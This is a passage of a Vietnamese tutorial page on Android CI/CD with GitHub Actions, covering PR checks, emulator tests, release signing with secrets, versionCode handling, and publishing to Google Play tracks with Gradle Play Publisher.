+  <li>Kết quả job thành check "Lint, unit test, build" trên PR.</li>
+</ol>
+
+<div class="mermaid">
+flowchart TD
+    A["(1) pull_request vào main"] --&gt; B["(2) concurrency huỷ lần chạy cũ&lt;br/&gt;permissions: contents read"]
+    B --&gt; C["(3) checkout, JDK 17"]
+    C --&gt; D["(4) setup-gradle&lt;br/&gt;kiểm tra wrapper, đọc cache"]
+    D --&gt; E["(5) lintDebug testDebugUnitTest assembleDebug"]
+    E --&gt;|"xanh hoặc đỏ"| F["(6) upload report"]
+    E --&gt;|"xanh"| G["(6) upload APK debug"]
+    F --&gt; H{"(7) Check trên PR"}
+    G --&gt; H
+</div>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="yaml"><code># .github/workflows/pr-check.yml
+name: PR check
+
+on:
+  pull_request:                                   # (1)
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read                                  # (2)
+
+concurrency:
+  group: pr-check-\${{ github.head_ref || github.ref }}
+  cancel-in-progress: true                        # (2)
+
+jobs:
+  build:
+    name: Lint, unit test, build                  # (7) tên check hiện trên PR
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v7                 # (3)
+      - uses: actions/setup-java@v6               # (3)
+        with:
+          distribution: temurin
+          java-version: '17'
+      - uses: gradle/actions/setup-gradle@v6      # (4)
+
+      - name: Lint, test, build                   # (5)
+        run: ./gradlew lintDebug testDebugUnitTest assembleDebug --continue
+
+      - name: Upload reports                      # (6) chạy cả khi bước trước đỏ
+        if: \${{ !cancelled() }}
+        uses: actions/upload-artifact@v7
+        with:
+          name: reports
+          path: |
+            app/build/reports/
+            app/build/test-results/
+          retention-days: 14
+
+      - name: Upload debug APK                    # (6) chỉ khi build xanh
+        uses: actions/upload-artifact@v7
+        with:
+          name: app-debug
+          path: app/build/outputs/apk/debug/*.apk
+          retention-days: 7</code></pre>
+
+<p><strong>Kết quả:</strong> PR có check "PR check / Lint, unit test, build" xanh hoặc đỏ; "Details" mở log từng step, cuối trang lần chạy có artifact <code>reports</code> (<code>lint-results-debug.html</code>, <code>tests/testDebugUnitTest/index.html</code>) và <code>app-debug</code>.</p>
+
+<p>Nhiều flavor thì dùng <code>strategy.matrix</code> chạy song song từng variant: xem <a href="../session_04/android_manifest/package_build_gradle/flavor.md" target="_blank" rel="noopener">Flavor</a>, mục "Kết hợp Flavor với CI/CD".</p>
+
+<h3>Chặn merge bằng required status check</h3>
+
+<p>Workflow chỉ <strong>báo</strong> kết quả; muốn PR đỏ <strong>không merge được</strong> phải bật luật trên <code>main</code> bằng <strong>branch protection rule</strong> (cũ) hoặc <strong>ruleset</strong> (mới hơn, áp cho nhiều nhánh và tag):</p>
+
+<ol>
+  <li><strong>Settings → Rules → Rulesets → New branch ruleset</strong>, Enforcement status Active, target nhánh mặc định.</li>
+  <li>Bật <strong>Require a pull request before merging</strong>: không ai push thẳng vào <code>main</code>.</li>
+  <li>Bật <strong>Require status checks to pass</strong>, thêm check theo <strong>tên job</strong> (<code>Lint, unit test, build</code>).</li>
+</ol>
+
+<div class="callout callout-warn"><span class="callout-icon">⚠️</span><div class="callout-body">Required check gắn với <strong>tên</strong> check. Đổi <code>name:</code> của job mà không sửa ruleset thì mọi PR kẹt ở "Expected — Waiting for status to be reported".</div></div>
+
+<p>Ruleset và branch protection có cho repo public ở mọi gói; repo private cần Pro, Team hoặc Enterprise.</p>
+
+<h3>Instrumented test trên emulator</h3>
+
+<p>Instrumented test và Compose UI test (<a href="../coding_analyst_and_testing/unit_testing.md" target="_blank" rel="noopener">10.2</a>) cần thiết bị:</p>
+
+<ul>
+  <li><strong>Emulator ngay trên runner</strong> bằng action cộng đồng <code>reactivecircus/android-emulator-runner</code>: tạo AVD, khởi động emulator, chạy <code>script</code> rồi tắt. Runner Linux tăng tốc được qua <strong>KVM</strong> sau khi mở quyền <code>/dev/kvm</code>.</li>
+  <li><strong>Firebase Test Lab</strong> (<code>gcloud firebase test android run</code>): thiết bị thật hoặc ảo của Google, nhiều model cùng lúc; vượt hạn mức miễn phí thì tính phí theo thời gian thiết bị.</li>
+</ul>
+
+<h4>Ví dụ: chạy UI test khi PR sẵn sàng review</h4>
+
+<p><strong>Bài toán:</strong> UI test mất ~10 phút; chỉ chạy cho PR sẵn sàng review (không phải draft) và khi lint/unit test đã xanh.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
+  <li>Nghe thêm <code>ready_for_review</code> để chạy lại khi PR rời trạng thái draft.</li>
+  <li>Job <code>instrumented</code> <code>needs: build</code>: chỉ chạy khi job build xanh.</li>
+  <li><code>if</code> bỏ qua job khi PR là draft (skipped).</li>
+  <li>Mở quyền KVM cho runner.</li>
+  <li>Tạo emulator API 34, chạy <code>connectedDebugAndroidTest</code>.</li>
+</ol>
+
+<div class="mermaid">
+flowchart TD
+    A["(1) pull_request: opened, synchronize,&lt;br/&gt;reopened, ready_for_review"] --&gt; B["Job build"]
+    B --&gt;|"xanh"| C{"(2) needs build&lt;br/&gt;(3) PR draft?"}
+    B --&gt;|"đỏ"| X["instrumented không chạy"]
+    C --&gt;|"draft"| S["skipped"]
+    C --&gt;|"sẵn sàng"| D["(4) bật KVM"]
+    D --&gt; E["(5) emulator API 34&lt;br/&gt;connectedDebugAndroidTest"]
+</div>
+
+<p><strong>Code:</strong> thêm vào <code>pr-check.yml</code> ở ví dụ trên.</p>
+
+<pre data-lang="yaml"><code># .github/workflows/pr-check.yml (phần thêm vào)
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened, ready_for_review]   # (1)
+
+jobs:
+  instrumented:
+    name: Instrumented test
+    needs: build                                  # (2)
+    if: \${{ !github.event.pull_request.draft }}   # (3)
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-java@v6
+        with:
+          distribution: temurin
+          java-version: '17'
+      - uses: gradle/actions/setup-gradle@v6
+      - name: Enable KVM                          # (4)
+        run: |
+          echo 'KERNEL=="kvm", GROUP="kvm", MODE="0666", OPTIONS+="static_node=kvm"' | sudo tee /etc/udev/rules.d/99-kvm4all.rules
+          sudo udevadm control --reload-rules
+          sudo udevadm trigger --name-match=kvm
+      - uses: reactivecircus/android-emulator-runner@v2   # (5) pin SHA trong dự án thật
+        with:
+          api-level: 34
+          arch: x86_64
+          target: google_apis
+          script: ./gradlew connectedDebugAndroidTest</code></pre>
+
+<p><strong>Kết quả:</strong> PR draft có check "Instrumented test" skipped; bấm "Ready for review" thì job chạy sau job build, report HTML ở <code>app/build/reports/androidTests/</code>.</p>
+
+<h3>Secret: đưa khoá ký vào CI</h3>
+
+<p><strong>Secret</strong> là giá trị mã hoá lưu trên GitHub, workflow đọc bằng expression <code>secrets.TÊN</code>; GitHub che (mask) giá trị nếu nó xuất hiện nguyên văn trong log. Hai phạm vi:</p>
+
+<ul>
+  <li><strong>Repository secret</strong>: mọi workflow trong repo đọc được.</li>
+  <li><strong>Environment secret</strong>: chỉ job khai báo <code>environment: production</code> đọc được; environment có <strong>required reviewers</strong> thì job <strong>chỉ đọc được secret sau khi có người duyệt</strong>. Khoá ký và khoá Play đặt ở đây.</li>
+</ul>
+
+<p>Tên secret dùng thống nhất trong Session 11:</p>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Secret</th>
+      <th style="padding:8px 12px;text-align:left;">Nội dung</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>RELEASE_KEYSTORE_BASE64</code></td>
+      <td style="padding:8px 12px;">File keystore (upload key) mã hoá base64</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>RELEASE_STORE_PASSWORD</code></td>
+      <td style="padding:8px 12px;">Mật khẩu keystore</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>RELEASE_KEY_ALIAS</code></td>
+      <td style="padding:8px 12px;">Alias của key trong keystore</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>RELEASE_KEY_PASSWORD</code></td>
+      <td style="padding:8px 12px;">Mật khẩu của key</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>PLAY_SERVICE_ACCOUNT_JSON</code></td>
+      <td style="padding:8px 12px;">Nội dung khoá JSON của service account Google Play (mục sau)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Keystore là file nhị phân nên mã hoá base64 thành chuỗi, giải mã lại trên runner. Tạo secret bằng GitHub CLI hoặc <strong>Settings → Secrets and variables → Actions</strong>:</p>
+
+<pre data-lang="bash"><code># Trên máy giữ keystore. Linux: base64 -w 0 (một dòng); macOS: base64 -i release.jks
+base64 -w 0 release.jks | gh secret set RELEASE_KEYSTORE_BASE64 --env production
+gh secret set RELEASE_STORE_PASSWORD --env production   # gh hỏi giá trị; tương tự cho KEY_ALIAS, KEY_PASSWORD
+gh secret set PLAY_SERVICE_ACCOUNT_JSON --env production &lt; play-service-account.json</code></pre>
+
+<p>Quy tắc khi dùng secret trong step:</p>
+
+<ul>
+  <li>Đưa secret vào step qua <code>env:</code> rồi dùng biến shell (<code>"$RELEASE_KEYSTORE_BASE64"</code>), không chèn expression secret thẳng vào chuỗi <code>run:</code>.</li>
+  <li>Mask chỉ che <strong>đúng chuỗi</strong> đã lưu, không che giá trị biến đổi từ secret (keystore đã giải mã): không <code>cat</code>, không <code>set -x</code>, không upload keystore làm artifact.</li>
+  <li>Ghi keystore ra <code>app/release.jks</code> (thêm <code>*.jks</code> vào <code>.gitignore</code>), xoá ở step cuối với <code>if: always()</code>; runner GitHub-hosted bị huỷ sau job, nhưng self-hosted runner giữ lại workspace.</li>
+  <li>Workflow chạy cho PR từ <strong>fork</strong> không nhận secret (trừ <code>GITHUB_TOKEN</code>): PR check không được phụ thuộc secret.</li>
+</ul>
+
+<h3>Cấu hình ký release chuẩn (signingConfigs.release)</h3>
+
+<p><a href="../session_04/android_manifest/package_build_gradle/build_types.md" target="_blank" rel="noopener">Build Types</a> đã cho <code>signingConfigs</code> đọc <code>System.getenv</code>. Bản chuẩn của Session 11 thêm đường dẫn keystore từ <code>RELEASE_STORE_FILE</code> (mặc định <code>release.jks</code>, tính từ module <code>app</code>) và <strong>fallback</strong> khi máy dev không có biến môi trường. Jenkins, Bitrise, Travis CI dùng lại đúng đoạn này.</p>
+
+<pre data-lang="kotlin"><code>// app/build.gradle.kts
+android {
+    signingConfigs {
+        create("release") {
+            // file() tính từ thư mục module: "release.jks" là app/release.jks
+            storeFile = file(System.getenv("RELEASE_STORE_FILE") ?: "release.jks")
+            storePassword = System.getenv("RELEASE_STORE_PASSWORD")
+            keyAlias = System.getenv("RELEASE_KEY_ALIAS")
+            keyPassword = System.getenv("RELEASE_KEY_PASSWORD")
+        }
+    }
+
+    buildTypes {
+        release {
+            isMinifyEnabled = true
+            proguardFiles(
+                getDefaultProguardFile("proguard-android-optimize.txt"),
+                "proguard-rules.pro",
+            )
+            // Có biến (CI) → upload key; không có (máy dev) → debug key để cài thử, Play từ chối bản này
+            val hasReleaseKey = System.getenv("RELEASE_STORE_PASSWORD") != null
+            signingConfig = if (hasReleaseKey) {
+                signingConfigs.getByName("release")
+            } else {
+                signingConfigs.getByName("debug")
+            }
+        }
+    }
+}</code></pre>
+
+<p>Kiểm tra <code>!= null</code> thay vì <code>isNullOrEmpty()</code> là có chủ ý: trên CI, secret chưa tạo vào <code>env:</code> thành chuỗi rỗng, nên build <strong>đỏ ở bước ký</strong> thay vì lặng lẽ ra bản ký debug. Đây là upload key; Google ký lại bằng app signing key khi phân phối (<a href="../session_01/output_packages/aab_files.md" target="_blank" rel="noopener">AAB</a>).</p>
+
+<h3>versionCode trên CI</h3>
+
+<p>Mỗi bản upload lên Play phải có <code>versionCode</code> <strong>chưa từng dùng</strong> cho app, bản cập nhật phải cao hơn bản người dùng đang cài; tối đa 2100000000. Cách chuẩn: Gradle đọc <code>versionCode</code> từ <strong>Gradle property</strong>, CI truyền số build của tool vào.</p>
+
+<pre data-lang="kotlin"><code>// app/build.gradle.kts
+android {
+    defaultConfig {
+        applicationId = "com.example.shop"
+        // CI truyền -PversionCode, -PversionName; máy dev dùng giá trị mặc định
+        versionCode = providers.gradleProperty("versionCode").orNull?.toInt() ?: 1
+        versionName = providers.gradleProperty("versionName").orNull ?: "0.0.0-dev"
+    }
+}</code></pre>
+
+<p>Trên GitHub Actions, số build là <code>GITHUB_RUN_NUMBER</code>: tăng dần <strong>theo từng workflow</strong>, bắt đầu từ 1, <strong>không đổi khi re-run</strong> (re-run tăng <code>GITHUB_RUN_ATTEMPT</code>). Hệ quả:</p>
+
+<ul>
+  <li>Re-run lần phát hành đã upload xong ra lại đúng <code>versionCode</code> cũ, Play từ chối; phải push tag mới.</li>
+  <li>App đã có bản trên Play (ví dụ <code>versionCode</code> 57), hoặc chuyển sang file workflow mới (số đếm lại từ 1), thì cộng offset: <code>1000 + GITHUB_RUN_NUMBER</code>.</li>
+</ul>
+
+<p>Tool khác chỉ thay nguồn số: Jenkins <code>BUILD_NUMBER</code> (job Pipeline thường; Multibranch xem <a href="jenkins.md" target="_blank" rel="noopener">11.1 Jenkins</a>), Bitrise <code>BITRISE_BUILD_NUMBER</code>, Travis CI <code>TRAVIS_BUILD_NUMBER</code>. Gradle property cũng đặt được qua biến <code>ORG_GRADLE_PROJECT_versionCode</code>.</p>
+
+<h3>Publish Store: Google Play nhận bản build từ CI thế nào</h3>
+
+<p>CI không đăng nhập Play Console; nó gọi <strong>Google Play Developer API</strong> bằng danh tính một <strong>service account</strong>. Mỗi lần upload là một <strong>edit</strong>: mở edit, upload AAB, gán AAB vào một <strong>release</strong> trên một <strong>track</strong>, commit edit. Mọi công cụ upload đều bọc chuỗi lời gọi này.</p>
+
+<h3>Service account cho Google Play Developer API</h3>
+
+<p><strong>Service account</strong> là tài khoản Google cho máy, định danh bằng email <code>...@&lt;project&gt;.iam.gserviceaccount.com</code>, xác thực bằng khoá JSON. Tài liệu hiện hành ghi <strong>không còn cần liên kết</strong> tài khoản developer với Google Cloud project, nhưng vẫn cần một project để bật API:</p>
+
+<ol>
+  <li>Trong <strong>Google Cloud Console</strong>, tạo hoặc chọn một project.</li>
+  <li>Bật <strong>Google Play Android Developer API</strong> cho project đó.</li>
+  <li>Tạo service account (<strong>IAM &amp; Admin → Service Accounts</strong>), tạo khoá JSON (chỉ tải được một lần), lưu vào secret <code>PLAY_SERVICE_ACCOUNT_JSON</code> rồi xoá bản trên máy.</li>
+  <li>Trong <strong>Play Console → Users and permissions</strong>, mời email service account như một user, chọn <strong>app</strong> nó được truy cập, cấp quyền tối thiểu: quyền release lên testing track; chỉ cấp quyền release production nếu CI promote lên production.</li>
+  <li>Chạy thử một lần upload lên internal để kiểm tra quyền.</li>
+</ol>
+
+<p>Quyền phát hành do Users and permissions của Play Console quyết định, không phải IAM.</p>
+
+<h3>Lần upload đầu tiên phải làm tay</h3>
+
+<p>Play Developer API <strong>không đăng ký được app mới</strong>: tạo app trong Play Console, upload AAB đầu tiên bằng tay (thường lên internal testing), thiết lập Play App Signing; từ bản sau CI mới upload được.</p>
+
+<p>Khi app còn ở trạng thái <strong>draft</strong> (chưa phát hành lần nào), API chỉ nhận release draft; upload <code>completed</code> bị từ chối với lỗi "Only releases with status draft may be created on draft app". Khi đó dùng <code>--release-status draft</code>, rồi hoàn tất trên Play Console.</p>
+
+<h3>Track và staged rollout</h3>
+
+<p><strong>Track</strong> là một kênh phân phối trong Play Console, có nhóm người nhận và release riêng:</p>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Track</th>
+      <th style="padding:8px 12px;text-align:left;">Ai nhận</th>
+      <th style="padding:8px 12px;text-align:left;">Đặc điểm</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Internal testing</td>
+      <td style="padding:8px 12px;">Tối đa 100 tester theo email</td>
+      <td style="padding:8px 12px;">Có trên Play trong vài phút, có thể không qua review chuẩn; đích của pipeline Release</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Closed testing</td>
+      <td style="padding:8px 12px;">Danh sách email hoặc Google Group</td>
+      <td style="padding:8px 12px;">QA, beta tester; tài khoản cá nhân tạo sau 13/11/2023 phải có closed test ít nhất 12 tester liên tục 14 ngày mới lên production được</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Open testing</td>
+      <td style="padding:8px 12px;">Ai cũng tham gia được từ trang app trên Play</td>
+      <td style="padding:8px 12px;">Beta công khai</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Production</td>
+      <td style="padding:8px 12px;">Mọi người dùng</td>
+      <td style="padding:8px 12px;">Qua review của Google; hỗ trợ staged rollout</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>Staged rollout</strong> là phát hành bản <strong>cập nhật</strong> cho một <strong>tỉ lệ</strong> người dùng ngẫu nhiên (<code>userFraction</code>, <code>0.1</code> = 10%, release ở trạng thái <code>inProgress</code>), rồi tăng dần khi crash và ANR (<a href="../coding_analyst_and_testing/fit_bug_optimization.md" target="_blank" rel="noopener">Android vitals, Crashlytics</a>) ổn:</p>
+
+<ul>
+  <li>Tỉ lệ <strong>không tự tăng</strong>; phải cập nhật tay hoặc qua API.</li>
+  <li><strong>Halt</strong> dừng phát cho người chưa nhận, người đã cài vẫn giữ bản đó; sửa bằng bản mới có <code>versionCode</code> cao hơn.</li>
+  <li>Không dùng được cho lần phát hành đầu; có trên production, closed và open testing.</li>
+</ul>
+
+<h3>Promote giữa các track</h3>
+
+<p><strong>Promote</strong> là đưa đúng <strong>một AAB đã upload</strong> (cùng <code>versionCode</code>) sang track khác, không build lại: bản QA đã thử trên internal chính là bản người dùng nhận.</p>
+
+<div class="mermaid">
+flowchart LR
+    CI["Pipeline Release&lt;br/&gt;tag v*"] --&gt; I["Internal testing&lt;br/&gt;team, QA"]
+    I --&gt;|"promote"| C["Closed testing&lt;br/&gt;beta tester"]
+    C --&gt;|"promote"| P1["Production 10%&lt;br/&gt;inProgress"]
+    I --&gt;|"promote"| P1
+    P1 --&gt;|"vitals ổn, tăng userFraction"| P2["Production 50%"]
+    P2 --&gt; P3["Production 100%&lt;br/&gt;completed"]
+    P1 --&gt;|"crash tăng"| H["halt, phát hành bản sửa"]
+</div>
+
+<p><strong>Release notes</strong> ("What's new") đi kèm mỗi release theo từng ngôn ngữ, tối đa 500 ký tự; với Gradle Play Publisher chúng là file trong repo (<code>app/src/main/play/release-notes/&lt;ngôn ngữ&gt;/&lt;track&gt;.txt</code> hoặc <code>default.txt</code>), review cùng code.</p>
+
+<h3>Upload lên Play: Gradle Play Publisher và các cách khác</h3>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Cách</th>
+      <th style="padding:8px 12px;text-align:left;">Điểm mạnh</th>
+      <th style="padding:8px 12px;text-align:left;">Điểm yếu</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>Gradle Play Publisher</strong> (plugin <code>com.github.triplet.play</code>)</td>
+      <td style="padding:8px 12px;">Chạy giống nhau trên mọi CI và máy dev; track, rollout, release notes nằm trong repo</td>
+      <td style="padding:8px 12px;">Thêm một plugin vào build</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>fastlane supply</strong> (<code>upload_to_play_store</code>)</td>
+      <td style="padding:8px 12px;">Quản lý cả metadata, ảnh store; một công cụ cho iOS và Android</td>
+      <td style="padding:8px 12px;">Thêm Ruby, Bundler vào môi trường build</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>Action cộng đồng</strong> (vd <code>r0adkll/upload-google-play</code>)</td>
+      <td style="padding:8px 12px;">Ít cấu hình nhất</td>
+      <td style="padding:8px 12px;">Chỉ chạy trên GitHub Actions; code bên thứ ba cầm khoá Play</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Bài chọn <strong>Gradle Play Publisher (GPP)</strong>: cùng một lệnh chạy trên mọi CI hay máy dev, chỉ khác chỗ lấy secret. README của GPP ghi dự án ở <strong>maintenance mode</strong> (issue bị bỏ qua, chỉ nhận pull request), dù vẫn ra bản 4.1.1 (08/2026). Cấu hình dùng GPP 4.1.1; dòng 4.x chỉ hỗ trợ AGP 9 trở lên, dự án còn ở AGP 8 dùng GPP 3.x:</p>
+
+<pre data-lang="kotlin"><code>// app/build.gradle.kts
+import com.github.triplet.gradle.androidpublisher.ReleaseStatus
+
+plugins {
+    id("com.android.application")
+    id("com.github.triplet.play") version "4.1.1"
+}
+
+play {
+    // Khoá: GPP đọc nội dung JSON từ biến môi trường ANDROID_PUBLISHER_CREDENTIALS
+    track.set("internal")                       // track mặc định của publish
+    defaultToAppBundles.set(true)               // publish AAB thay vì APK
+    releaseStatus.set(ReleaseStatus.COMPLETED)  // DRAFT khi app còn ở trạng thái draft
+}</code></pre>
+
+<p>Tên task theo quy ước của AGP <code>[action][Variant][Thing]</code>: <code>publishBundle</code>/<code>promoteArtifact</code> chạy cho mọi variant, <code>publishReleaseBundle</code>/<code>promoteReleaseArtifact</code> chỉ cho variant <code>release</code>. <code>--artifact-dir</code> (tính từ thư mục gốc dự án) upload AAB có sẵn, không build lại; <code>--track</code>, <code>--release-status</code>, <code>--user-fraction</code> ghi đè <code>play {}</code> cho một lần chạy. AAB đã chứa <code>mapping.txt</code> của R8 nên Play tự giải mã stack trace; plugin Crashlytics tự upload mapping khi build (<a href="../coding_analyst_and_testing/fit_bug_optimization.md" target="_blank" rel="noopener">10.4</a>).</p>
+
+<h3>Pipeline Release trên tag v*</h3>
+
+<p>Pipeline Release ráp mọi phần trên. Environment <code>production</code> (<strong>Settings → Environments</strong>) có: <strong>Required reviewers</strong> (tối đa 6 người hoặc team, bật "Prevent self-review" để người push tag không tự duyệt), <strong>Deployment branches and tags</strong> là "Selected branches and tags" chỉ gồm tag <code>v*</code> (job chạy trên ref khác, kể cả <code>main</code>, bị từ chối), và các environment secret ở trên.</p>
+
+<div class="callout callout-important"><span class="callout-icon">🔴</span><div class="callout-body">Trên repo <strong>private</strong>, required reviewers chỉ có ở GitHub Enterprise (Free, Pro, Team chỉ có cho repo public), environment secret cần ít nhất Pro hoặc Team. Thiếu required reviewers thì dùng <strong>tag ruleset</strong> giới hạn ai được tạo tag <code>v*</code>, và giữ promote lên production là bước tay có chủ đích.</div></div>
+
+<h4>Ví dụ: phát hành v1.4.0 lên internal track</h4>
+
+<p><strong>Bài toán:</strong> app đã có trên Play; mỗi tag như <code>v1.4.0</code> phải thành AAB đã ký trên internal testing cho QA, sau khi người thứ hai duyệt.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
+  <li>Push tag <code>v1.4.0</code> kích hoạt workflow; <code>concurrency</code> chặn hai lần phát hành chạy chồng.</li>
+  <li>Job <code>environment: production</code> chờ duyệt; duyệt xong mới đọc được environment secret.</li>
+  <li>Giải mã <code>RELEASE_KEYSTORE_BASE64</code> ra <code>app/release.jks</code>.</li>
+  <li><code>bundleRelease</code> với biến ký, <code>versionCode</code> = 1000 + <code>GITHUB_RUN_NUMBER</code>, <code>versionName</code> = tag bỏ chữ <code>v</code>.</li>
+  <li>Lưu AAB và <code>mapping.txt</code> làm artifact 90 ngày.</li>
+  <li>GPP upload AAB vừa build lên internal track bằng khoá service account.</li>
+  <li>Xoá keystore, kể cả khi bước trước lỗi.</li>
+</ol>
+
+<div class="archify-embed" data-src="archify/android/s11-github-release-to-play.html" data-title="Pipeline Release: từ tag tới Play internal track">
+  <a class="archify-full" href="archify/android/s11-github-release-to-play.html" target="_blank" rel="noopener">Mở toàn màn hình ↗</a>
+</div>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="yaml"><code># .github/workflows/release.yml
+name: Release
+
+on:
+  push:
+    tags: ['v*']                                  # (1)
+
+permissions:
+  contents: read
+
+concurrency:
+  group: release                                  # (1) promote.yml dùng cùng group
+  cancel-in-progress: false
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    environment: production                       # (2)
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-java@v6
+        with:
+          distribution: temurin
+          java-version: '17'
+      - uses: gradle/actions/setup-gradle@v6
+
+      - name: Decode keystore                     # (3)
+        env:
+          RELEASE_KEYSTORE_BASE64: \${{ secrets.RELEASE_KEYSTORE_BASE64 }}
+        run: echo "$RELEASE_KEYSTORE_BASE64" | base64 --decode &gt; app/release.jks
+
+      - name: Build signed AAB                    # (4)
+        env:
+          RELEASE_STORE_FILE: release.jks
+          RELEASE_STORE_PASSWORD: \${{ secrets.RELEASE_STORE_PASSWORD }}
+          RELEASE_KEY_ALIAS: \${{ secrets.RELEASE_KEY_ALIAS }}
+          RELEASE_KEY_PASSWORD: \${{ secrets.RELEASE_KEY_PASSWORD }}
+        run: |
+          ./gradlew bundleRelease \\
+            -PversionCode=$((1000 + GITHUB_RUN_NUMBER)) \\
+            -PversionName="\${GITHUB_REF_NAME#v}"
+
+      - name: Upload AAB and mapping              # (5)
+        uses: actions/upload-artifact@v7
+        with:
+          name: release-\${{ github.ref_name }}
+          path: |
+            app/build/outputs/bundle/release/*.aab
+            app/build/outputs/mapping/release/mapping.txt
+          if-no-files-found: error
+          retention-days: 90
+
+      - name: Upload to Play internal track       # (6) upload đúng AAB vừa build, không build lại
+        env:
+          ANDROID_PUBLISHER_CREDENTIALS: \${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}
+        run: ./gradlew publishReleaseBundle --artifact-dir app/build/outputs/bundle/release
+
+      - name: Remove keystore                     # (7)
+        if: always()
+        run: rm -f app/release.jks</code></pre>
+
+<p><strong>Kết quả:</strong> lần chạy "Release" ở trạng thái "Waiting" kèm nút "Review deployments"; duyệt xong, log step (6) báo upload thành công. <strong>Play Console → Testing → Internal testing</strong> có release mới với <code>versionCode</code> dạng 10xx, release notes từ <code>default.txt</code>; artifact <code>release-v1.4.0</code> chứa AAB và <code>mapping.txt</code>.</p>
+
+<h2>Deep Dive: bỏ khoá JSON bằng Workload Identity Federation</h2>
+
+<p>Khoá JSON của service account sống lâu: lộ một lần là người khác upload được lên Play tới khi bạn thu hồi. <strong>Workload Identity Federation (WIF)</strong> của Google Cloud cho runner đổi <strong>OIDC token</strong> GitHub cấp cho từng job lấy credential ngắn hạn, không lưu khoá:</p>
+
+<ol>
+  <li>Tạo Workload Identity Pool và provider OIDC cho GitHub, giới hạn theo repo; cho principal của pool quyền <strong>mạo danh</strong> (impersonate) service account đã mời trong Play Console.</li>
+  <li>Workflow khai báo <code>permissions: id-token: write</code>, gọi <code>google-github-actions/auth@v3</code> với <code>workload_identity_provider</code> và <code>service_account</code> để đặt Application Default Credentials (ADC).</li>
+  <li>GPP dùng ADC bằng <code>useApplicationDefaultCredentials = true</code>.</li>
+</ol>
+
+<div class="callout callout-danger"><span class="callout-icon">⛔</span><div class="callout-body">Tài liệu Play Developer API không nhắc tới WIF; cách trên ghép từ tài liệu WIF của Google Cloud và tuỳ chọn ADC của GPP, chưa có hướng dẫn chính thức: thử trên app nội bộ trước.</div></div>
+
+<h2>Ví dụ thực tế</h2>
+
+<ol>
+  <li><strong>Promote từ internal lên production với staged rollout</strong> (code dưới đây).</li>
+  <li><strong>Tăng hoặc dừng rollout:</strong> cập nhật tại chỗ release đang chạy trên production: <code>promoteReleaseArtifact --update production --user-fraction 0.5</code>, hoặc <code>--release-status halted</code>.</li>
+  <li><strong>Nhiều app dùng chung pipeline:</strong> gom step chung thành <strong>composite action</strong> (<code>action.yml</code>, <code>runs.using: composite</code>) hoặc <strong>reusable workflow</strong> (<code>on: workflow_call</code>, gọi bằng <code>uses: org/ci-templates/.github/workflows/android-check.yml@v1</code>), đổi JDK một chỗ cho mọi repo.</li>
+</ol>
+
+<h3>Promote internal lên production 10% bằng một nút bấm</h3>
+
+<p><strong>Bài toán:</strong> QA đã duyệt bản trên internal; cần đưa đúng bản đó lên production cho 10% người dùng, có người thứ hai duyệt, không thao tác trên Play Console.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
+  <li>Bấm "Run workflow", ở "Use workflow from" chọn <strong>tag</strong> của bản cần promote (environment chỉ nhận tag <code>v*</code>; tag phải chứa <code>promote.yml</code>), nhập <code>user_fraction</code> (mặc định <code>0.1</code>).</li>
+  <li>Job chờ duyệt environment <code>production</code>, chung <code>concurrency</code> group với Release.</li>
+  <li>GPP promote release mới nhất của internal sang production ở trạng thái <code>inProgress</code> với tỉ lệ đã nhập.</li>
+</ol>
+
+<div class="mermaid">
+flowchart LR
